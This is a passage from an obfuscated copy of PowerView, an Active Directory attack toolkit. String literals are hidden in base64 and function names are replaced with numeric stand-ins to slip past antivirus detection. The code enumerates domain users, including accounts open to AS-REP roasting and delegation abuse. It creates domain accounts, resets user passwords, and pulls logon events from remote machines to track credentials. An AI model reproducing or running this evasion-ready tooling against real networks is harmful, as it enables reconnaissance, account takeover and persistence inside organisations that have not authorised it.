        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${379} = f74 @48
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            f115 -CreateVariables -BoundParameters $PSBoundParameters
        }
        if (${379}) {
            ${251} = ''
            $Filter = ''
            $Identity | ? {$_} | % {
                ${252} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if (${252} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAA==')))) {
                    ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewAyADUAMgB9ACkA')))
                }
                elseif (${252} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQA=')))) {
                    ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAMgA1ADIAfQApAA==')))
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        ${254} = ${252}.SubString(${252}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAEUAeAB0AHIAYQBjAHQAZQBkACAAZABvAG0AYQBpAG4AIAAnACQAewAyADUANAB9ACcAIABmAHIAbwBtACAAJwAkAHsAMgA1ADIAfQAnAA==')))
                        ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${254}
                        ${379} = f74 @48
                        if (-not ${379}) {
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFUAbgBhAGIAbABlACAAdABvACAAcgBlAHQAcgBpAGUAdgBlACAAZABvAG0AYQBpAG4AIABzAGUAYQByAGMAaABlAHIAIABmAG8AcgAgACcAJAB7ADIANQA0AH0AJwA=')))
                        }
                    }
                }
                elseif (${252} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                    ${253} = (([Guid]${252}).ToByteArray() | % { '\' + $_.ToString('X2') }) -join ''
                    ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7ADIANQAzAH0AKQA=')))
                }
                elseif (${252}.Contains('\')) {
                    ${401} = ${252}.Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA'))), '(').Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))), ')') | f111 -f40 Canonical
                    if (${401}) {
                        $UserDomain = ${401}.SubString(0, ${401}.IndexOf('/'))
                        ${120} = ${252}.Split('\')[1]
                        ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAHsAMQAyADAAfQApAA==')))
                        ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAEUAeAB0AHIAYQBjAHQAZQBkACAAZABvAG0AYQBpAG4AIAAnACQAVQBzAGUAcgBEAG8AbQBhAGkAbgAnACAAZgByAG8AbQAgACcAJAB7ADIANQAyAH0AJwA=')))
                        ${379} = f74 @48
                    }
                }
                else {
                    ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAHsAMgA1ADIAfQApAA==')))
                }
            }
            if (${251} -and (${251}.Trim() -ne '') ) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewAyADUAMQB9ACkA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBQAE4A')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIABuAG8AbgAtAG4AdQBsAGwAIABzAGUAcgB2AGkAYwBlACAAcAByAGkAbgBjAGkAcABhAGwAIABuAGEAbQBlAHMA')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGUAcgB2AGkAYwBlAFAAcgBpAG4AYwBpAHAAYQBsAE4AYQBtAGUAPQAqACkA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AEQAZQBsAGUAZwBhAHQAaQBvAG4A')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIAB1AHMAZQByAHMAIAB3AGgAbwAgAGMAYQBuACAAYgBlACAAZABlAGwAZQBnAGEAdABlAGQA')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAdQBzAGUAcgBBAGMAYwBvAHUAbgB0AEMAbwBuAHQAcgBvAGwAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAxADAANAA4ADUANwA0ACkAKQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYQBsAGwAbwB3AEQAZQBsAGUAZwBhAHQAaQBvAG4A')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIAB1AHMAZQByAHMAIAB3AGgAbwAgAGEAcgBlACAAcwBlAG4AcwBpAHQAaQB2AGUAIABhAG4AZAAgAG4AbwB0ACAAdAByAHUAcwB0AGUAZAAgAGYAbwByACAAZABlAGwAZQBnAGEAdABpAG8AbgA=')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADEAMAA0ADgANQA3ADQAKQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIABhAGQAbQBpAG4AQwBvAHUAbgB0AD0AMQA=')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABhAGQAbQBpAG4AYwBvAHUAbgB0AD0AMQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGUAZABUAG8AQQB1AHQAaAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIAB1AHMAZQByAHMAIAB0AGgAYQB0ACAAYQByAGUAIAB0AHIAdQBzAHQAZQBkACAAdABvACAAYQB1AHQAaABlAG4AdABpAGMAYQB0AGUAIABmAG8AcgAgAG8AdABoAGUAcgAgAHAAcgBpAG4AYwBpAHAAYQBsAHMA')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABtAHMAZABzAC0AYQBsAGwAbwB3AGUAZAB0AG8AZABlAGwAZQBnAGEAdABlAHQAbwA9ACoAKQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGUAYQB1AHQAaABOAG8AdABSAGUAcQB1AGkAcgBlAGQA')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIAB1AHMAZQByACAAYQBjAGMAbwB1AG4AdABzACAAdABoAGEAdAAgAGQAbwAgAG4AbwB0ACAAcgBlAHEAdQBpAHIAZQAgAGsAZQByAGIAZQByAG8AcwAgAHAAcgBlAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABlAA==')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADQAMQA5ADQAMwAwADQAKQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFUAcwBpAG4AZwAgAGEAZABkAGkAdABpAG8AbgBhAGwAIABMAEQAQQBQACAAZgBpAGwAdABlAHIAOgAgACQATABEAEEAUABGAGkAbAB0AGUAcgA=')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            $UACFilter | ? {$_} | % {
                if ($_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwAuACoA')))) {
                    ${458} = $_.Substring(4)
                    ${457} = [Int](${23}::${458})
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAdQBzAGUAcgBBAGMAYwBvAHUAbgB0AEMAbwBuAHQAcgBvAGwAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAkAHsANAA1ADcAfQApACkA')))
                }
                else {
                    ${457} = [Int](${23}::$_)
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ACQAewA0ADUANwB9ACkA')))
                }
            }
            ${379}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMwA2ADgAKQAkAEYAaQBsAHQAZQByACkA')))
            Write-Verbose "[Get-DomainUser] filter string: $(${379}.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${72} = ${379}.FindOne() }
            else { ${72} = ${379}.FindAll() }
            ${72} | ? {$_} | % {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    ${f10} = $_
                    ${f10}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAC4AUgBhAHcA'))))
                }
                else {
                    ${f10} = f104 -Properties $_.Properties
                    ${f10}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAA=='))))
                }
                ${f10}
            }
            if (${72}) {
                try { ${72}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAEUAcgByAG8AcgAgAGQAaQBzAHAAbwBzAGkAbgBnACAAbwBmACAAdABoAGUAIABSAGUAcwB1AGwAdABzACAAbwBiAGoAZQBjAHQAOgAgACQAXwA=')))
                }
            }
            ${379}.dispose()
        }
    }
}
function New-DomainUser {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $AccountPassword,
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,
        [ValidateNotNullOrEmpty()]
        [String]
        $DisplayName,
        [ValidateNotNullOrEmpty()]
        [String]
        $Description,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    ${383} = @{
        'Identity' = $SamAccountName
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${383}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${383}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    ${405} = f110 @383
    if (${405}) {
        ${f10} = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList (${405}.Context)
        ${f10}.SamAccountName = ${405}.Identity
        ${470} = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
        ${f10}.SetPassword(${470}.GetNetworkCredential().Password)
        ${f10}.Enabled = $True
        ${f10}.PasswordNotRequired = $False
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA=')))]) {
            ${f10}.Name = $Name
        }
        else {
            ${f10}.Name = ${405}.Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAcABsAGEAeQBOAGEAbQBlAA==')))]) {
            ${f10}.DisplayName = $DisplayName
        }
        else {
            ${f10}.DisplayName = ${405}.Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA==')))]) {
            ${f10}.Description = $Description
        }
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAEEAdAB0AGUAbQBwAHQAaQBuAGcAIAB0AG8AIABjAHIAZQBhAHQAZQAgAHUAcwBlAHIAIAAnACQAUwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlACcA')))
        try {
            $Null = ${f10}.Save()
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFUAcwBlAHIAIAAnACQAUwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlACcAIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAGMAcgBlAGEAdABlAGQA')))
            ${f10}
        }
        catch {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAEUAcgByAG8AcgAgAGMAcgBlAGEAdABpAG4AZwAgAHUAcwBlAHIAIAAnACQAUwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlACcAIAA6ACAAJABfAA==')))
        }
    }
}
function Set-DomainUserPassword {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('UserName', 'UserIdentity', 'User')]
        [String]
        $Identity,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $AccountPassword,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    ${383} = @{ 'Identity' = $Identity }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${383}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${383}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    ${405} = f110 @383
    if (${405}) {
        ${f10} = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity(${405}.Context, $Identity)
        if (${f10}) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAUABhAHMAcwB3AG8AcgBkAF0AIABBAHQAdABlAG0AcAB0AGkAbgBnACAAdABvACAAcwBlAHQAIAB0AGgAZQAgAHAAYQBzAHMAdwBvAHIAZAAgAGYAbwByACAAdQBzAGUAcgAgACcAJABJAGQAZQBuAHQAaQB0AHkAJwA=')))
            try {
                ${470} = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
                ${f10}.SetPassword(${470}.GetNetworkCredential().Password)
                $Null = ${f10}.Save()
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAUABhAHMAcwB3AG8AcgBkAF0AIABQAGEAcwBzAHcAbwByAGQAIABmAG8AcgAgAHUAcwBlAHIAIAAnACQASQBkAGUAbgB0AGkAdAB5ACcAIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAHIAZQBzAGUAdAA=')))
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAUABhAHMAcwB3AG8AcgBkAF0AIABFAHIAcgBvAHIAIABzAGUAdAB0AGkAbgBnACAAcABhAHMAcwB3AG8AcgBkACAAZgBvAHIAIAB1AHMAZQByACAAJwAkAEkAZABlAG4AdABpAHQAeQAnACAAOgAgACQAXwA=')))
            }
        }
        else {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAUABhAHMAcwB3AG8AcgBkAF0AIABVAG4AYQBiAGwAZQAgAHQAbwAgAGYAaQBuAGQAIAB1AHMAZQByACAAJwAkAEkAZABlAG4AdABpAHQAeQAnAA==')))
        }
    }
}
function f83 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogonEvent')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${94} = ${Env:94},
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${f9} = [DateTime]::Now.AddDays(-1),
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${f8} = [DateTime]::Now,
        [ValidateRange(1, 1000000)]
        [Int]
        $MaxEvents = 5000,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${469} = @"
<QueryList>
    <Query Id="0" Path="Security">

        <!-- Logon events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4624)
                    and TimeCreated[
                        @SystemTime&gt;='$(${f9}.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$(${f8}.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
            and
            *[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]
        </Select>

        <!-- Logon with explicit credential events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4648)
                    and TimeCreated[
                        @SystemTime&gt;='$(${f9}.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$(${f8}.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
        </Select>

        <Suppress Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and
                    (Level=4 or Level=0) and (EventID=4624 or EventID=4625 or EventID=4634)
                ]
            ]
            and
            *[
                EventData[
                    (
                        (Data[@Name='LogonType']='5' or Data[@Name='LogonType']='0')
                        or
                        Data[@Name='TargetUserName']='ANONYMOUS LOGON'
                        or
                        Data[@Name='TargetUserSID']='S-1-5-18'
                    )
                ]
            ]
        </Suppress>
    </Query>
</QueryList>
"@
        ${468} = @{
            'FilterXPath' = ${469}
            'LogName' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AA==')))
            'MaxEvents' = $MaxEvents
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${468}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        ForEach (${116} in ${94}) {
            ${468}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))] = ${116}
            Get-WinEvent @468| % {
                ${467} = $_
                $Properties = ${467}.Properties
                Switch (${467}.Id) {
                    4624 {
                        if(-not $Properties[5].Value.EndsWith('$')) {
                            ${134} = New-Object PSObject -Property @{
                                ComputerName              = ${116}
                                TimeCreated               = ${467}.TimeCreated
                                EventId                   = ${467}.Id
                                SubjectUserSid            = $Properties[0].Value.ToString()
                                SubjectUserName           = $Properties[1].Value
                                SubjectDomainName         = $Properties[2].Value
                                SubjectLogonId            = $Properties[3].Value
                                TargetUserSid             = $Properties[4].Value.ToString()
                                TargetUserName            = $Properties[5].Value
                                TargetDomainName          = $Properties[6].Value
                                TargetLogonId             = $Properties[7].Value
                                LogonType                 = $Properties[8].Value
                                LogonProcessName          = $Properties[9].Value
                                AuthenticationPackageName = $Properties[10].Value
                                WorkstationName           = $Properties[11].Value
                                LogonGuid                 = $Properties[12].Value
                                TransmittedServices       = $Properties[13].Value
                                LmPackageName             = $Properties[14].Value
                                KeyLength                 = $Properties[15].Value
                                ProcessId                 = $Properties[16].Value
                                ProcessName               = $Properties[17].Value
                                IpAddress                 = $Properties[18].Value
                                IpPort                    = $Properties[19].Value
                                ImpersonationLevel        = $Properties[20].Value
                                RestrictedAdminMode       = $Properties[21].Value
                                TargetOutboundUserName    = $Properties[22].Value
                                TargetOutboundDomainName  = $Properties[23].Value
                                VirtualAccount            = $Properties[24].Value
                                TargetLinkedLogonId       = $Properties[25].Value
                                ElevatedToken             = $Properties[26].Value
                            }
                            ${134}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AZwBvAG4ARQB2AGUAbgB0AA=='))))
                            ${134}
                        }
                    }
                    4648 {
                        if((-not $Properties[5].Value.EndsWith('$')) -and ($Properties[11].Value -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABhAHMAawBoAG8AcwB0AFwALgBlAHgAZQA='))))) {
                            ${134} = New-Object PSObject -Property @{
                                ComputerName              = ${116}
                                TimeCreated       = ${467}.TimeCreated
                                EventId           = ${467}.Id
                                SubjectUserSid    = $Properties[0].Value.ToString()
                                SubjectUserName   = $Properties[1].Value
                                SubjectDomainName = $Properties[2].Value
                                SubjectLogonId    = $Properties[3].Value
                                LogonGuid         = $Properties[4].Value.ToString()
                                TargetUserName    = $Properties[5].Value
                                TargetDomainName  = $Properties[6].Value
                                TargetLogonGuid   = $Properties[7].Value
                                TargetServerName  = $Properties[8].Value
                                TargetInfo        = $Properties[9].Value
                                ProcessId         = $Properties[10].Value
                                ProcessName       = $Properties[11].Value
                                IpAddress         = $Properties[12].Value
                                IpPort            = $Properties[13].Value
                            }
                            ${134}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBFAHgAcABsAGkAYwBpAHQAQwByAGUAZABlAG4AdABpAGEAbABMAG8AZwBvAG4ARQB2AGUAbgB0AA=='))))
                            ${134}
                        }
                    }
                    default {
                        Write-Warning "No handler exists for event ID: $(${467}.Id)"
                    }
                }
            }
        }
    }
}
function f113 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    ${430} = @{'00000000-0000-0000-0000-000000000000' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA')))}
    ${466} = @{}
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${466}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    try {
        ${464} = (f72 @466).schema.name
    }
    catch {
